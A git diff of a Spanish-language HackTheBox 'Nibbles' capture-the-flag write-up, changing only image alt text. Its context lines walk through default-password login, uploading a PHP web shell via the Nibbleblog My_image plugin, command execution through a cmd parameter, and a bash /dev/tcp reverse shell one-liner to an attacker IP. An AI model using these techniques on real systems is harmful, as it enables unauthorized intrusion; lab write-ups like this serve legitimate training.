@@ -98,15 +98,15 @@ http://10.10.10.75/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[U
 
 No tenemos nada interesante, así que visualizaremos el contenido vía web.
 
-![](/assets/images/htb-nibbles/nibbles-web.png)
+![""](/assets/images/htb-nibbles/nibbles-web.png)
 
 Si vemos el código fuente de la página web, nos encontramos con un comentario en donde se nos muestra el recurso `/nibbleblog/`:
 
-![](/assets/images/htb-nibbles/nibbles-web1.png)
+![""](/assets/images/htb-nibbles/nibbles-web1.png)
 
 Si ingresamos a dicho recurso, poca cosa vemos.
 
-![](/assets/images/htb-nibbles/nibbles-web2.png)
+![""](/assets/images/htb-nibbles/nibbles-web2.png)
 
 Ahora, vamos a tratar de descubrir recursos en el servidor web  con la herramienta `nmap`:
 
@@ -130,7 +130,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
 
 Un recurso interesante que ya nos llamada la atención es `/content`, `/admin/` y `/admin.php`. Primero vamos a checar `/content/` y se trata de un listado de directorios.
 
-![](/assets/images/htb-nibbles/nibbles-web3.png)
+![""](/assets/images/htb-nibbles/nibbles-web3.png)
 
 Para trabajar más cómodos, vamos a traernos los recursos de dicho directorio a nuestra máquina.
 
@@ -302,11 +302,11 @@ Para verlo de una forma más cómoda, vamos a instalar `yq` con el comando `pip 
 
 Vemos el usuario **admin**, pero no vemos la contraseña. Por lo tanto, podriamos pensar que debe existir un panel de login, el cual se encuentra en `/admin.php`:
 
-![](/assets/images/htb-nibbles/nibbles-web4.png)
+![""](/assets/images/htb-nibbles/nibbles-web4.png)
 
 Podríamos tratar de utilizar contraseñas por defecto, como **admin**, **passoword**, **admin123** e incluso el nombre de la máquina (ya que esto es un CTF) y vemos que la contraseña es el propio nombre de la máquina para el usuario **admin**.
 
-![](/assets/images/htb-nibbles/nibbles-web5.png)
+![""](/assets/images/htb-nibbles/nibbles-web5.png)
 
 A este punto, podríamos tratar de buscar exploits públicos asociados a **nibbleblog**:
 
@@ -344,11 +344,11 @@ vprint_status("#{peer} - Uploading payload...")
 
 En esta parte nos indica algunos campos como **plugins**, **config** y **my_image** y si checamos vía web, vemos que podría tratarse de una ruta.
 
-![](/assets/images/htb-nibbles/nibbles-web6.png)
+![""](/assets/images/htb-nibbles/nibbles-web6.png)
 
 Si la damos click en **Configure** dentro del campo **My_image**, vemos que podemos subir un archivo; sin embargo, no sabemos que tipo de archivos nos pueda permitir subir.
 
-![](/assets/images/htb-nibbles/nibbles-web7.png)
+![""](/assets/images/htb-nibbles/nibbles-web7.png)
 
 Por lo tanto, vamos a tratar de ver si podemos subir un archivo php.
 
@@ -358,11 +358,11 @@ Por lo tanto, vamos a tratar de ver si podemos subir un archivo php.
 ?>
 ```
 
-![](/assets/images/htb-nibbles/nibbles-web8.png)
+![""](/assets/images/htb-nibbles/nibbles-web8.png)
 
 En la parte de abajo nos debe aparecer un mensaje indicando que el archivo se subir exitosamente. Ahora debemos descubrir la ruta en donde se alojó nuestro archivo y si ponemos un poco de atención en lo que nos descargamos de el recurso `/content/`, vemos que bajo la ruta `/content/private/` existe un directorio llamado **plugins** y dentro de este se encuentra otro directorio de nombre **my_image**; por lo que es muy probable que ahí este nuestro archivo.
 
-![](/assets/images/htb-nibbles/nibbles-web9.png)
+![""](/assets/images/htb-nibbles/nibbles-web9.png)
 
 Vamos a seleccionar nuestro archivo y tratar de ejecutar algún comando a nivel de sistema.
 
@@ -370,7 +370,7 @@ Vamos a seleccionar nuestro archivo y tratar de ejecutar algún comando a nivel 
 http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami
 ```
 
-![](/assets/images/htb-nibbles/nibbles-web10.png)
+![""](/assets/images/htb-nibbles/nibbles-web10.png)
 
 Tenemos ejecución de comandos a nivel de sistema, por lo tanto, trataremos de entablarnos una reverse shell; así que nos podremos en escucha por el puerto 443 y ejecutamos nuestro comando. Si tratamos varias veces, vemos que no podemos entablarnos la reverse shell, esto se debe a que existen caracteres que al servidor no le gusta; por lo tanto vamos a probar de ver que caracteres son utilizando `bash -i >& /dev/tcp/10.10.14.27/443 0>&1`.
 
